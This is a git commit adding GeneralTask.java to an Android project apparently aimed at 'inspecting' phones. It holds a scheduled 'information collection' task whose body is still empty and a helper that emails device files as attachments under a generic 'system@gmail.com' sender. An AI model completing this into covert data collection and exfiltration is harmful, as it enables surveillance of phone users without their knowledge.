7996c36da2ca3d43d02c02696d6d0be246edf817
richardroky <richardroky@gmail.com>
2011-09-27 09:47:23 +0000

    add AuthSrv

---
+++ AuthSrv/src/com/particle/inspector/authsrv/GeneralTask.java
@@ -0,0 +1,92 @@
+package com.particle.inspector.authsrv;
+
+import java.io.DataOutputStream;
+import java.io.File;
+import java.text.SimpleDateFormat;
+import java.util.ArrayList;
+import java.util.Calendar;
+import java.util.Date;
+import java.util.List;
+import java.util.TimerTask;
+
+import javax.activation.DataHandler;
+import javax.activation.FileDataSource;
+import javax.mail.Message;
+import javax.mail.Multipart;
+import javax.mail.Transport;
+import javax.mail.internet.InternetAddress;
+import javax.mail.internet.MimeBodyPart;
+import javax.mail.internet.MimeMessage;
+import javax.mail.internet.MimeMultipart;
+
+import com.particle.inspector.authsrv.activity.GlobalPrefActivity;
+import com.particle.inspector.authsrv.util.ConfigCtrl;
+import com.particle.inspector.authsrv.util.SysUtils;
+import com.particle.inspector.authsrv.util.mail.GMailSenderEx;
+
+import android.app.Activity;
+import android.app.Service;
+import android.content.ActivityNotFoundException;
+import android.content.Context;
+import android.content.Intent;
+import android.content.res.Resources;
+import android.net.Uri;
+import android.os.Environment;
+import android.util.Log;
+
+/**
+ * Implementation of the timer task for information collection.
+ */
+public class GeneralTask extends TimerTask 
+{
+	private final static String LOGTAG = "GeneralTask";
+	
+	public Service service;
+	
+	public GeneralTask(Service service)
+	{
+		super();
+		this.service = service;
+	}
+	
+	public void run() 
+	{
+		Log.d(LOGTAG, "start to collect infomation");
+		
+		// If network connected, try to collect and send the information
+		if (!SysUtils.isNetworkConnected(service.getApplicationContext())) return;
+		
+		
+	}
+	
+	
+	
+	public static boolean sendMail(String subject, String body, String sender, String pwd, String[] recipients, List<String> files)
+	{
+		boolean ret = false;
+
+        try {   
+            GMailSenderEx gmailSender = new GMailSenderEx(sender, pwd);
+            gmailSender.setFrom("system@gmail.com");
+            gmailSender.setTo(recipients);
+            gmailSender.setSubject(subject);
+            gmailSender.setBody(body);
+            
+            for(int i = 0; i < files.size(); i++)
+            	gmailSender.addAttachment(files.get(i));//e.g. "/sdcard/filelocation"
+            
+            ret = gmailSender.send();
+        } catch (Exception e) {   
+            Log.e(LOGTAG, (e == null) ? "Failed to send mail" : e.getMessage());
+        }
+        
+		return ret;
+	}
+	
+	private static String[] getRecipients(Context context)
+	{
+		String mail = GlobalPrefActivity.getMail(context);
+		return mail.split(",");
+	}
+	
+}
